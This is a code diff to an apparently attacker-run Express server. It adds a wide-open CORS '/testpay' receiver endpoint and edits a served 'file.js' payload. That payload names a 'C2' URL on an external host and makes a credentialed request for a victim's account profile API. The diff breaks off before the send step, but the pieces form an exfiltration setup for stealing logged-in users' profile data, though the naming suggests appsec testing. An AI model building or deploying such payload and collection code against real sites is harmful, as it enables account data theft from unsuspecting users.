@@ -17,11 +17,26 @@ app.get("/", (_req, res) => {
   res.redirect("/login");
 });
 
+app.use("/testpay", (req, res, next) => {
+  res.set({
+    "Access-Control-Allow-Origin": "*",
+    "Access-Control-Allow-Methods": "POST, OPTIONS",
+    "Access-Control-Allow-Headers": "Content-Type"
+  });
+  next();
+});
+
+app.options("/testpay", (_req, res) => res.sendStatus(204));
+
+app.post("/testpay", (_req, res) => {
+  res.type("html").send("<!doctype html><html lang=\"en\"><title>Test</title><body>hello</body></html>");
+});
+
 app.get("/file.js", (_req, res) => {
   res.type("application/javascript").send(`
   var C2 = 'https://appsec-test-website.onrender.com/testpay';
   var x = new XMLHttpRequest();
-  x.open('GET', '/sgw3/secureapp/N600/profileapi/v1/profile', false);
+  x.open('GET', '/sgw3/secureapp/N600/Proxy/AccountOpenAPI/v1/Client/profile', false);
   x.withCredentials = true;
   x.send();
   
